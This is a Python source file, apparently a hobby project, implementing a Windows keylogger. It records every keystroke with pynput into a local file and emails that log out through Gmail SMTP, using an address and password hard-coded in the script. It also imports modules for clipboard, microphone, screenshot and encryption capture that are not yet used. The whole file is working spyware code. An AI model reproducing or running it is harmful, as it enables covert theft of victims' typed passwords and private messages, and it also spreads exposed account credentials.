# Libraries

# Email Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Libraries for collecting computer info
import socket
import platform
from os import replace

# Clipboard
import win32clipboard

# Grab Keystrokes
from pynput.keyboard import Key, Listener

# System Info to track Time
import time
import os

# Microphone
from scipy.io.wavfile import write
import sounddevice as sd

# Encrypt files
from cryptography.fernet import Fernet

# Get username and some more computer info
import getpass
from requests import get

# Screenshot (only take one ss at a time)
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# For appending all keys that are logged
keys_information = "key_log.txt"
email_address = "mrtommyriddle@gmail.com"
password = "L0rdV0ld3m0r7!"

toaddr = "mrtommyriddle@gmail.com"

file_path = "C:\\Users\\pranj\\Desktop\\KeyLogger"
extend = "\\"

# Send Email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "KeyLogger Log File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

# Logging Keys
count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
